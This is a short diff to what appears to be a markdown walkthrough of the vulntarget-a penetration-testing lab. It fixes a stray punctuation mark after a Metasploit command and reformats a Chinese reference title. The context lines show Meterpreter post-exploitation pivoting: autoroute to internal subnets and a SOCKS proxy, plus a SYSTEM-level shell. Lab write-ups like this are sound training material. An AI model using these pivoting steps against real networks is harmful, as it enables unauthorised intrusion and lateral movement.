@@ -585,7 +585,7 @@ meterpreter > run post/multi/manage/autoroute
 [+] Route added to subnet 10.0.10.0/255.255.255.0 from host's routing table.
 [+] Route added to subnet 10.0.20.0/255.255.255.0 from host's routing table.
 meterpreter > bg
-msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy、
+msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
 msf6 auxiliary(server/socks_proxy) > exploit
 [*] Auxiliary module running as background job 0.
 [*] Starting the SOCKS proxy server
@@ -728,4 +728,4 @@ nt authority\system
 
 ## Reference
 
-[渗透靶场——vulntarget-a综合靶场 - 先知社区](https://xz.aliyun.com/t/12422?time__1311=GqGxRQ0%3DEx9DlrzG7bGOYD8jEQAKqwod3x)
+[渗透靶场 - vulntarget-a 综合靶场 - 先知社区](https://xz.aliyun.com/t/12422?time__1311=GqGxRQ0%3DEx9DlrzG7bGOYD8jEQAKqwod3x)
